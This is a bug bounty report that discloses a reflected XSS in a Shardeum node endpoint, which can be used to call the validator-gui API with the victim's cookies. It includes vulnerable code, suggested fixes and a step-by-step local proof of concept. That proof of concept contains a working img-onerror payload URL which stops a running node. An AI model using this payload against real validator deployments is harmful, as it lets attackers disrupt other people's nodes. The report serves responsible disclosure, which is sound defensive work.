# Boost \_ Shardeum\_ Ancillaries 33692 - \[Websites and Applications - Low] Reflected XSS in validator n

Submitted on Fri Jul 26 2024 14:07:57 GMT-0400 (Atlantic Standard Time) by @neplox for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33692

Report type: Websites and Applications

Report severity: Low

Target: <https://github.com/shardeum/validator-gui/tree/dev>

Impacts:

* Taking down the application/website
* Injection of malicious HTML or XSS through metadata

## Description

## Brief/Intro

Validator GUI allows users to start running a Shardeum node, which means having the external endpoints be hosted using HTTP on a different port on the same server. This opens a door for client-side vulnerabilities which can be executed Same-Site (Same Origin vs Same Site info: <https://web.dev/articles/same-site-same-origin#site>). The only protection validator-gui has from attacks such as CSRF is Same-Site Strict cookies. As suggested from the name, they can't protect from attacks within the same site.

As such, achieving XSS on one of the validator node (Shardeum node) endpoints allows access to validator-gui cookies and authorized endpoints. Currently, this allows an attacker to leverage an XSS in order to shut down the node via validator-gui's API.

## Vulnerability Details

The shardus-core (<https://github.com/shardeum/shardus-core>) part of the node defines lots of HTTP endpoints that return response using the `res.send()` function that by default sends data with the `text/html` content type.

An example of such endpoint:

<https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/p2p/SyncV2/routes.ts#L74>

```js
/** An endpoint that returns the last hashed validator list if the expected (requested)
 * hash matches. */
const validatorListRoute: P2P.P2PTypes.Route<Handler> = {
  method: 'GET',
  name: 'validator-list',
  handler: (req, res) => {
    let respondSize = 0
    profilerInstance.scopedProfileSectionStart('validator-list', false)
    try {
      const expectedHash = req.query.hash

      // return the validator list if the hash from the requester matches
      if (expectedHash && expectedHash === NodeList.getNodeListHash()) {
        //res.json(NodeList.getLastHashedNodeList())
        const getLastHashedNodeList = NodeList.getLastHashedNodeList()
        respondSize = jsonHttpResWithSize(res, getLastHashedNodeList)
      } else {
        /* prettier-ignore */ if (logFlags.debug) console.error( `rejecting validator list request: expected '${expectedHash}' != '${NodeList.getNodeListHash()}'` )
        res.status(404).send(`validator list with hash '${expectedHash}' not found`)
      }
    } finally {
      profilerInstance.scopedProfileSectionEnd('validator-list', respondSize)
    }
  },
}
```

As we can see from the code, the function would return `res.status(404).send("validator list with hash '${expectedHash}' not found")` in case an incorrect hash supplied. The value of the `hash` parameter would be inserted directly to the response with `text/html` content type what in turn leads to XSS.

Because validator-gui runs the Shardeum node locally, on the same site, if we use this XSS to attack an authenticated user on the validator-gui dashboard, we will be able to request all the API endpoints within the validator-gui.

## Impact Details

It's possible to request validator-gui API endpoints with authentication. Using the currently available endpoints, it can be used to completely stop the node. As the functionality of the dashboard grows, new different attack vectors can be discovered (such as configuration editing).

## Possible solutions

* Add a more robust CSRF protection for the validator-gui. For example, CSRF tokens. In this case, we won't be able to execute API requests from the node because we can't access CSRF token as we can't read data cross-site without a properly setted up CORS.
* Don't send data with text/html content-type from the node. For example, you can use `res.type('txt')` before every `res.send()` call.

## Proof of concept

### Set up shardeum network

Clone the Shardeum repo and switch to the last commit on the dev branch, which is c7b10c2370028f7c7cbd2a01839e50eb50faa904 as of this POC's submission.

```
git clone https://github.com/shardeum/shardeum.git
cd shardeum
git switch --detach c7b10c2370028f7c7cbd2a01839e50eb50faa904
```

Switch to NodeJS 18.16.1, which is the version used by Shardeum in dev.Dockerfile and its various library requirements. For example, using asdf (<https://asdf-vm.com/>):

```
asdf install nodejs 18.16.1
asdf local nodejs 18.16.1
```

or

```
nvm use 18.16.1
```

Apply the debug-10-nodes.patch for network setup.

```
git apply debug-10-nodes.patch
```

Install dependencies and build the project.

```
npm ci
npm run prepare
```

Launch the network with 10 nodes as specified in the patch using the shardus tool.

```
npx shardus create 9
```

wait for a bit

### Set up validator-cli

```
git clone https://github.com/shardeum/validator-cli
cd validator-cli
nvm use 18.16.1
npm ci && npm link

# ../shardeum is where you have shardeum cloned.
ln -sr ../shardeum ../validator
```

change config in `./build/config.json` to <https://gist.github.com/Sh1Yo/0251aae4ea821fc4242b0a6978931209> so that operator-cli will use the correct archive and start a node on a correct port.

### Set up validator-gui

```
git clone https://github.com/shardeum/validator-gui/
cd validator-gui
echo NEXT_PUBLIC_RPC_URL=http://127.0.0.1:8081 > .env
```

Modify the `loginHandler` function from the `api/auth.ts`, replace with the content below:

```js
export const loginHandler = (req: Request, res: Response) => {
  const accessToken = jwt.sign({ nodeId: '' /** add unique node id  */ }, jwtSecret, { expiresIn: '8h' })

  res.cookie("accessToken", accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
  });
  res.send({ status : 'ok' })
}
```

I've removed the password validation with `validator-cli` to simplify the PoC. In the real life we assume that a victim is logged in to the `validator-gui` with his own password.

Comment out the `/node/status` route from `api/handlers/node.ts`. For some reasons this endpoint causes fatal errors in the web server:

```
apiRouter.get(
    '/node/status',
    asyncRouteHandler(async (req: Request, res: Response<NodeStatusResponse>) => {
        // Exec the CLI validator stop command
        execFile('operator-cli', ['status'], (err, stdout, stderr) => {
          console.log('operator-cli status: ', err, stdout, stderr);
          if (err) {
            cliStderrResponse(res, 'Unable to fetch status', err.message)
            return
          }
          if (stderr) {
            cliStderrResponse(res, 'Unable to fetch status', stderr)
            return
          }
          let yamlData: NodeStatus = yaml.load(stdout);
          if (yamlData.state === 'active') {
            lastActiveNodeState = yamlData;
          } else if (yamlData.state === 'stopped') {
            yamlData = {
              ...yamlData,
              nodeInfo: lastActiveNodeState?.nodeInfo
            }
          }
          res.json(yamlData);
        });
        console.log('executing operator-cli status...');
      }
    ));
```

change the node version

```
nvm use 18.16.1
```

install

```
npm ci
```

build

```
npm run build
```

generate keys

```
# Generate the private key
openssl genpkey -algorithm RSA -out selfsigned.key -pkeyopt rsa_keygen_bits:2048

# Generate a self-signed certificate
openssl req -new -x509 -key selfsigned.key -out selfsigned.crt -days 365
```

run

```
npm start
```

### Exploit

Open `https://localhost:8080/login` and enter any password so that you will have a valid session.

Start node by either making a post request to `https://localhost:8080/api/node/start` or running `operator-cli start`.

if everything is setted up right, you will be able to access <http://localhost:9000>. In the `validator-cli/validator-logs.txt` there will be validator logs.

If there are errors then you can skip this step and use a random node to confirm XSS (the nodes are running on localhost:9001-localhost:9010) instead.

Now, we will request this route from `api/handlers/node.ts`using an XSS attack:

```js
  apiRouter.post('/node/stop', asyncRouteHandler(async (req: Request, res: Response) => {
    // Exec the CLI validator stop command
    console.log('executing operator-cli stop...');
    execFileSync('operator-cli', ['stop', '-f'])
    res.status(200).json({status: "ok"})
  }));
```

To stop the node we just have to execute a POST request to `/api/node/stop` (with cookies). To do so we can use the following js command:

`fetch("https://localhost:8080/api/node/stop", {"credentials":"include","method":"post"})`

So if we trick the victim to open our site or the link with the payload directly, we will be able to stop the node.

Open `http://localhost:9000/validator-list?hash=<img src=x onerror='fetch("https://localhost:8080/api/node/stop", {"credentials":"include","method":"post"}) '>` **you may want to use a different port like 9001-9010 if operator-cli wasn't able to start the node correctly**

If there was a running node on localhost:9000, it's now stopped.

If a node on localhost:9000 wasn't running, you can still confirm that the XSS attack worked. While we can't read the body, we still can be assured that the request pass through. In the console we can see that the request returned status code: 200 - `Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://localhost:8080/api/node/stop. (Reason: CORS header ‘Access-Control-Allow-Origin’ missing). Status code: 200` In the proxy, for example burp, we can see that the request successfully executed as well (see screenshot)
